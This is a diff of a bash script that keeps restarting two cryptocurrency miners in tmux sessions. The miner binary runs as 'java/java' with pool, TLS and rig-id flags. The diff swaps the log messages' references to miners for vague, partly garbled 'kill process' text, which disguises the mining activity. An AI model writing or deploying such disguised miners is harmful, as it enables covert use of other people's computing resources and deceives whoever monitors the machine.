@@ -37,13 +37,13 @@ fi
 echo "[+] Vòng lặp ..."
 while true; do
     pkill -f "$(pwd)/java/java" 2>/dev/null
-    echo "[+] Kill process - sleep 10s..."
+    echo "[+] kill process kill process kill process kill process - sleep 10s..."
     sleep 10
 
     tmux kill-session -t $SESSION1 2>/dev/null
     tmux kill-session -t $SESSION2 2>/dev/null
 
-    echo "[+] Start 2 miners - sleep 5 phút..."
+    echo "[+] Start 2 process - sleep 5 phút..."
     
     # Miner 1
     tmux new-session -s $SESSION1 -d
@@ -57,6 +57,6 @@ while true; do
         $(pwd)/java/java -o $DOMAIN --tls -k -t 4 --rig-id ${NAME_WORK}-2
     " C-m
 
-    echo "[+] Both miners started - sleep 120s..."
+    echo "[+] Both kill process started - kill process kill process sleep 120s..."
     sleep 120
 done
